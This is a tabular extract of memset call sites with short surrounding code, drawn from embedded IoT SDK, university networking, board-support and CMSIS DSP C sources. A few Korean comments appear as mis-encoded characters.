2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlHandle.tTargetVal, 0, sizeof(BRIGHT_DATA_T));  */",120,1,"        vLightShadeCtrlDisable();       /* stop all shade process! */

        memset(&tLightCtrlHandle.tTargetVal, 0, sizeof(BRIGHT_DATA_T));  /* set target contol data!!! */
        if(BRIGHT_MODE_CCT == tLightCfgData.eBrightMode) {   /* CCT drive mode make sure don't change warm */
            tLightCtrlHandle.tTargetVal.usWarm = tLightCtrlHandle.tCurrVal.usWarm;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlHandle.tCurrVal, 0, sizeof(tLightCtrlHandle.tCurrVal));",120,1,"                                                tLightCtrlHandle.tTargetVal.usWhite, tLightCtrlHandle.tTargetVal.usWarm);

                    memset(&tLightCtrlHandle.tCurrVal, 0, sizeof(tLightCtrlHandle.tCurrVal));
                    if(opRet != LIGHT_OK) {
                        PR_ERR(""Light ctrl music mode shutdown set RGBCW error!"");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tMusicCtrlData, 0, sizeof(LIGHT_CTRL_DATA_T));",120,1,"
            LIGHT_CTRL_DATA_T tMusicCtrlData;
            memset(&tMusicCtrlData, 0, sizeof(LIGHT_CTRL_DATA_T));
            memcpy(&tMusicCtrlData, &tLightCtrlData, SIZEOF(LIGHT_CTRL_DATA_T));     /* make sure music mode restart as red color */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tCtrlDataTemp, 0, SIZEOF(LIGHT_CTRL_DATA_T));",120,1,"    PR_DEBUG(""hsv %d %d %d"",usHue,usSat,usVal);

    memset(&tCtrlDataTemp, 0, SIZEOF(LIGHT_CTRL_DATA_T));

    if((WHITE_MODE == tLightCtrlData.eMode) || (COLOR_MODE == tLightCtrlData.eMode)){
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tSaveData, 0, SIZEOF(LIGHT_APP_DATA_FLASH_T));",120,1,"    }

    memset(&tSaveData, 0, SIZEOF(LIGHT_APP_DATA_FLASH_T));

    tSaveData.bPower = tLightCtrlData.bSwitch;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tCtrlData, 0, SIZEOF(BRIGHT_DATA_T));",120,1,"
    PR_DEBUG(""normal display...."");
    memset(&tCtrlData, 0, SIZEOF(BRIGHT_DATA_T));

    vLightShadeCtrlDisable();       /* stop all shade process! */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlHandle.tTargetVal, 0, SIZEOF(BRIGHT_DATA_T));",120,1,"                usStandIndex = 0;

                memset(&tLightCtrlHandle.tTargetVal, 0, SIZEOF(BRIGHT_DATA_T));
                vLightCtrlDefColorBrightCalc(tLightCfgData.eNetColor, tLightCfgData.usDefBright, tLightCfgData.usNetTemper, &tLightCtrlHandle.tTargetVal);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_set_color\light_set_color.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_set_color\light_set_color.c,"memset(&tPwmColor, 0, SIZEOF(USER_PWM_COLOR_T));",120,1,"        case DRIVER_MODE_PWM:{
                USER_PWM_COLOR_T tPwmColor;
                memset(&tPwmColor, 0, SIZEOF(USER_PWM_COLOR_T));   
                 
                tPwmColor.usRed = usRed;        /* pwm color range 0 ~ 1000 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_system\light_init.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_system\light_init.c,"memset(&tDeviceCfg, 0, SIZEOF(tDeviceCfg));",120,1,"    DEVICE_CONFIG_T tDeviceCfg;

    memset(&tDeviceCfg, 0, SIZEOF(tDeviceCfg));

#if (DEMO_LIGHT_WAY == CMOD_C)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\brd_mem.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\brd_mem.h,"os_memset((void*)_pDest, _iData, _iSize)",120,1,"
#define MUSB_MemSet(_pDest, _iData, _iSize) \
    os_memset((void*)_pDest, _iData, _iSize)
#endif	/* multiple inclusion protection */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\func\joint_up\role_launch.c,"os_memset(&g_rl_sta_key, 0, sizeof(g_rl_sta_key));",120,1,"            rl_pre_sta_init();
			#if RL_SUPPORT_FAST_CONNECT
			os_memset(&g_rl_sta_key, 0, sizeof(g_rl_sta_key));
			os_strcpy(g_rl_sta_key, req->descr.wifi_key);
			rl_read_bssid_info(&bssid_info);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\gpio_test.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\gpio_test.c,"memset(ctempbuf, 0, SIZEOF(ctempbuf));",120,1,"                strncpy(ctempbuf, pstart, ((ptemp - pstart) * SIZEOF(CHAR_T)));
                gpio_test_table.group[group_cnt].iopin[io_cnt] = atoi(ctempbuf);
                memset(ctempbuf, 0, SIZEOF(ctempbuf));
                pstart = ptemp + 1;
                io_cnt++;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,"memset(&read_gw_wsm, 0, sizeof(GW_WORK_STAT_MAG_S));",120,1,"    GW_WORK_STAT_MAG_S read_gw_wsm ;
    
    memset(&read_gw_wsm, 0, sizeof(GW_WORK_STAT_MAG_S));
    op_ret = wd_gw_wsm_read(&read_gw_wsm);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,"memset(wsm,0,SIZEOF(GW_WORK_STAT_MAG_S));",120,1,"        GW_WORK_STAT_MAG_S *wsm = (GW_WORK_STAT_MAG_S *)Malloc(SIZEOF(GW_WORK_STAT_MAG_S));
        if(NULL != wsm){
            memset(wsm,0,SIZEOF(GW_WORK_STAT_MAG_S));
            op_ret = wd_gw_wsm_write(wsm);
            if(OPRT_OK != op_ret){
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,"memset(ug_proc,0,SIZEOF(UG_PROC_S));",120,1,"        return;
    }
    memset(ug_proc,0,SIZEOF(UG_PROC_S));
	#endif
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\tuya_main.c,"memset(&ug_proc->file_header, 0, SIZEOF(UPDATE_FILE_HDR_S));",120,1,"            //PR_DEBUG(""sw_version:%s  bin_len = 0x%x   bin_sum = 0x%x\r\n"",ug_proc->file_header.sw_version, ug_proc->file_header.bin_len,ug_proc->file_header.bin_sum);
            if((ug_proc->file_header.header_flag !=  UG_PKG_HEAD) || (ug_proc->file_header.tail_flag !=  UG_PKG_TAIL) || (ug_proc->file_header.head_sum != sum_tmp )) {
                memset(&ug_proc->file_header, 0, SIZEOF(UPDATE_FILE_HDR_S));
                PR_ERR(""bin_file data header err: header_flag(0x%x) tail_flag(0x%x) bin_sum(0x%x) get_sum(0x%x)"",ug_proc->file_header.header_flag,ug_proc->file_header.tail_flag,ug_proc->file_header.head_sum,sum_tmp);
//                return OPRT_OTA_BIN_CHECK_ERROR;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,"memset(key_mag,0,SIZEOF(KEY_MANAGE_S));",120,1,"        return OPRT_MALLOC_FAILED;
    }
    memset(key_mag,0,SIZEOF(KEY_MANAGE_S));

    OPERATE_RET op_ret = OPRT_OK;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,"memset(key_mag->p_tbl,0,SIZEOF(KEY_ENTITY_S) * cnt);",120,1,"            goto ERR_EXIT;
        }
        memset(key_mag->p_tbl,0,SIZEOF(KEY_ENTITY_S) * cnt);
    }
    else{
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_key.c,"memset(key_ent_lst,0,SIZEOF(KEY_EN_LST_S));",120,1,"        return OPRT_MALLOC_FAILED;
    }
    memset(key_ent_lst,0,SIZEOF(KEY_EN_LST_S));
    memcpy(&(key_ent_lst->key_ent.kud),key_ud,SIZEOF(KEY_USER_DEF_S));
    key_ent_lst->key_ent.key_val_last = TRUE;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_led.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_led.c,"memset(len_cntl,0,sizeof(LED_CNTL_S));",120,1,"        return OPRT_MALLOC_FAILED;
    }
    memset(len_cntl,0,sizeof(LED_CNTL_S));
    len_cntl->port = port;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\driver\tuya_uart.c,"memset(&ty_uart[port], 0, sizeof(TUYA_UART_S));",120,1,"
    if(ty_uart[port].buf == NULL){
        memset(&ty_uart[port], 0, sizeof(TUYA_UART_S));
        ty_uart[port].buf = Malloc(bufsz);
        if(ty_uart[port].buf == NULL){
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\driver\tuya_hal_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\driver\tuya_hal_wifi.c,"os_memset(&country, 0, sizeof(wifi_country_t));",120,1,"	int i, country_num;
	
	os_memset(&country, 0, sizeof(wifi_country_t));
	country_num = sizeof(country_code)/sizeof(wifi_country_t);
	for(i = 0; i < country_num; i++) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\driver\tuya_hal_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\driver\tuya_hal_wifi.c,"memset(frame_msg, 0, len);",120,1,"        return OPRT_MALLOC_FAILED;
    }
    memset(frame_msg, 0, len);
    
    memcpy(frame_msg, frame, len);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\system\tuya_hal_system.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\system\tuya_hal_system.c,"memset(serial_no,'\0',sizeof(serial_no));",120,1,"    }

    memset(serial_no,'\0',sizeof(serial_no));
    sprintf(serial_no,""%02x%02x%02x%02x%02x%02x"",mac1.mac[0],mac1.mac[1],\
            mac1.mac[2],mac1.mac[3],mac1.mac[4],mac1.mac[5]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\sdk\include\log_seq.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\sdk\include\log_seq.h,"memset(ls_data.data.str_data,0,SIZEOF(ls_data.data.str_data)); \",120,1,"    ls_data.seq_num = seq; \
    ls_data.ldt = LDT_STRING; \
    memset(ls_data.data.str_data,0,SIZEOF(ls_data.data.str_data)); \
    UCHAR_T len = strlen(str) < STR_DATA_MAX_LENGTH ? strlen(str) : STR_DATA_MAX_LENGTH; \
    memcpy(ls_data.data.str_data,str,len); \
"
2021\univ-csProject\DB+C_POS Implement\res_pos.c,Dataset Download,../../Dataset Download/2021\univ-csProject\DB+C_POS Implement\res_pos.c,"memset(q_final, 0, sizeof(q_final));",120,1,"	printf("" ë©”ë‰´í˜„í™© íŽ˜ì´ì§€ìž…ë‹ˆë‹¤.\n\n"");
	
	memset(q_final, 0, sizeof(q_final));	
	append_query(q_final, q_printMenu);
	append_query(q_final, query);	
"
2021\univ-csProject\DB+C_POS Implement\res_pos.c,Dataset Download,../../Dataset Download/2021\univ-csProject\DB+C_POS Implement\res_pos.c,"memset(query, 0, sizeof(query));",120,1,"			strcpy(q_menuPrice,row[i]);
	}
	memset(query, 0, sizeof(query));

}
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,"memset((char *) &serv_addr, 0, sizeof(struct sockaddr_in));",120,1,"	 * server that we want to send to.
	 */
	  memset((char *) &serv_addr, 0, sizeof(struct sockaddr_in));

	serv_addr.sin_family	  = AF_INET;
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,"memset((char *) &sendseg, 0, sizeof(sendseg));",120,1,"
 	/* TCP í—¤ë” ì„¤ì • */
	memset((char *) &sendseg, 0, sizeof(sendseg));

	make_tcp_header(SYN, &sendseg, src_port, dst_port, seq, ack, datalen );
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,"memset((char *)&sendseg, 0, sizeof(sendseg));",120,1,"	/*1. PSH í—¤ë” ì „ì†¡*/
	printf(""\nData transmission......\n"");
	memset((char *)&sendseg, 0, sizeof(sendseg));	
	
	seq = time(0)%3146246342;
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emulc.c,"memset((char *) &recvseg, 0, sizeof(sendseg));",120,1,"
	//FIN-ACKí›„, ë‹¤ì‹œ FIN ìž¬ì „ì†¡
	memset((char *) &recvseg, 0, sizeof(sendseg));
	if(nbyte = read(sockfd, &recvseg, MAXDATA)< 0) {
		perror(""(ACK)read fail\n"");
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,"memset(&cli_addr, 0, addrlen);",120,1,"		/* accept connection */
		printf(""server: waiting ......\n"");
		memset(&cli_addr, 0, addrlen);
		msgsock = accept(sockfd, (struct sockaddr *)&cli_addr, (int *)&addrlen);
/*
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,"memset((char *)&recvseg, 0, sizeof(sendseg));",120,1,"				}
				else if(t_tcb[conn-1].t_info.tcpi_state == TCP_SYN_RECV){
					memset((char *)&recvseg, 0, sizeof(sendseg));
					memcpy(&recvseg.tcp, buf, sizeof buf);
					
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,"memset(buf,0, sizeof buf);",120,1,"			/*ë°ì´í„° ì „ì†¡ê³¼ì •*/
			printf(""server: Data waiting(Transmission/PSH)....%s.\n"",argv[1]);
			memset(buf,0, sizeof buf);
			/* read data */
			if((rval = read(msgsock, buf, 1024)) == -1){
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,"memset((char *)&recvseg, 0, sizeof sendseg);",120,1,"			}
			else if(t_tcb[conn-1].t_info.tcpi_state == TCP_ESTABLISHED){
				memset((char *)&recvseg, 0, sizeof sendseg);
				memcpy(&recvseg.tcp, buf, sizeof buf);
				//print_tcphdr((struct tcphdr *)buf);
"
2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\Network Final Teamproject\tcp_emuls.c,"memset((char *) &recvseg, 0, sizeof sendseg);",120,1,"			}
			else if(t_tcb[conn-1].t_info.tcpi_state == TCP_ESTABLISHED){
				memset((char *) &recvseg, 0, sizeof sendseg);
				memcpy(&recvseg.tcp, buf, sizeof buf);

"
2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,"memset(&serv_addr, 0, sizeof(serv_addr));",120,1,"		sock=socket(PF_INET, SOCK_STREAM, 0);
									
		memset(&serv_addr, 0, sizeof(serv_addr));
		serv_addr.sin_family=AF_INET;
		serv_addr.sin_addr.s_addr=inet_addr(argv[1]);
"
2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\io_ctrl_bsp\mb0_microblaze_0\include\xenv_standalone.h,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\io_ctrl_bsp\mb0_microblaze_0\include\xenv_standalone.h,"memset((void *) DestPtr, (s32) Data, (size_t) Bytes)",120,1,"
#define XENV_MEM_FILL(DestPtr, Data, Bytes) \
	memset((void *) DestPtr, (s32) Data, (size_t) Bytes)


"
2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\zynq_fsbl_bsp\ps7_cortexa9_0\include\xemacps_bd.h,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\zynq_fsbl_bsp\ps7_cortexa9_0\include\xemacps_bd.h,"memset((BdPtr), 0, sizeof(XEmacPs_Bd))",120,1," *****************************************************************************/
#define XEmacPs_BdClear(BdPtr)                                  \
    memset((BdPtr), 0, sizeof(XEmacPs_Bd))

/****************************************************************************/
"
2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\zynq_fsbl_bsp\ps7_cortexa9_0\libsrc\emacps_v3_4\src\xemacps_bdring.c,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Hardware_Design\LinuxSys.sdk\zynq_fsbl_bsp\ps7_cortexa9_0\libsrc\emacps_v3_4\src\xemacps_bdring.c,"(void)memset((void *) VirtAddrLoc, 0, (RingPtr->Separation * BdCount));",120,1,"	 *  - Setup each BD's BDA field with the physical address of the next BD
	 */
	(void)memset((void *) VirtAddrLoc, 0, (RingPtr->Separation * BdCount));

	BdVirtAddr = VirtAddrLoc;
"
2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,"memset(&sa_pipe, 0, sizeof(struct sigaction));",120,1,"        // Register the signal handler for SIGPIPE
        struct sigaction sa_pipe;
        memset(&sa_pipe, 0, sizeof(struct sigaction));
        sa_pipe.sa_handler = &sig_handler_sigpipe;
        if (sigaction(SIGPIPE, &sa_pipe, NULL) == -1) {
"
2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,"memset(&sa, 0, sizeof(struct sigaction));",120,1,"        // Register the signal handler for SIGINT (CTRL+C)
        struct sigaction sa;
        memset(&sa, 0, sizeof(struct sigaction));
        sa.sa_handler = &sig_handler_sigint;
        if (sigaction(SIGINT, &sa, NULL) == -1) {
"
2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,Dataset Download,../../Dataset Download/2021\virtual-festo-twin\Zedboard\vsp_tcp\server.cpp,"memset(&sa_term, 0, sizeof(struct sigaction));",120,1,"        // Register the signal handler for SIGTERM
        struct sigaction sa_term;
        memset(&sa_term, 0, sizeof(struct sigaction));
        sa_term.sa_handler = &sig_handler_sigterm;
        if (sigaction(SIGTERM, &sa_term, NULL) == -1) {
"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"memset(wifi_dev.rx_buffer, 0, WIFI_RX_BUFFER_SIZE);",120,1,"static void clear_rx_buffer()
{
	memset(wifi_dev.rx_buffer, 0, WIFI_RX_BUFFER_SIZE);
	wifi_dev.rx_index = 0;
}
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\JTest\inc\jtest_fw.h,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\JTest\inc\jtest_fw.h,"memset(JTEST_FW.buf_name, 0, JTEST_BUF_SIZE);   \",120,1,"    do                                                  \
    {                                                   \
        memset(JTEST_FW.buf_name, 0, JTEST_BUF_SIZE);   \
    } while (0)

"
2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\platform\GCC\Retarget.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\platform\GCC\Retarget.c,"memset (st, 0, sizeof (* st));",120,1,"int __attribute__((weak)) _fstat (int fd, struct stat * st) 
{
  memset (st, 0, sizeof (* st));
  st->st_mode = S_IFCHR;
  return (0);
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_f32.c,"memset(S->state, 0, 3U * sizeof(float32_t));",120,1,"  {
    /* Clear the state buffer.  The size will be always 3 samples */
    memset(S->state, 0, 3U * sizeof(float32_t));
  }

"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_q15.c,"memset(S->state, 0, 3U * sizeof(q15_t));",120,1,"  {
    /* Clear the state buffer.  The size will be always 3 samples */
    memset(S->state, 0, 3U * sizeof(q15_t));
  }

"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\ControllerFunctions\arm_pid_init_q31.c,"memset(S->state, 0, 3U * sizeof(q31_t));",120,1,"  {
    /* Clear the state buffer.  The size will be always 3 samples */
    memset(S->state, 0, 3U * sizeof(q31_t));
  }

"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_32x64_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_32x64_init_q31.c,"memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q63_t));",120,1,"
  /* Clear state buffer and size is always 4 * numStages */
  memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q63_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_f32.c,"memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always 4 * numStages */
  memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_q15.c,"memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q15_t));",120,1,"
  /* Clear state buffer and size is always 4 * numStages */
  memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q15_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df1_init_q31.c,"memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always 4 * numStages */
  memset(pState, 0, (4U * (uint32_t) numStages) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df2T_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df2T_init_f32.c,"memset(pState, 0, (2U * (uint32_t) numStages) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always 2 * numStages */
  memset(pState, 0, (2U * (uint32_t) numStages) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df2T_init_f64.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_biquad_cascade_df2T_init_f64.c,"memset(pState, 0, (2U * (uint32_t) numStages) * sizeof(float64_t));",120,1,"
  /* Clear state buffer and size is always 2 * numStages */
  memset(pState, 0, (2U * (uint32_t) numStages) * sizeof(float64_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_f32.c,"memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(float32_t));",120,1,"
    /* Clear state buffer and size is always (blockSize + numTaps - 1) */
    memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(float32_t));

    /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_q15.c,"memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q15_t));",120,1,"
    /* Clear the state buffer.  The size of buffer is always (blockSize + numTaps - 1) */
    memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q15_t));

    /* Assign state pointer */
"
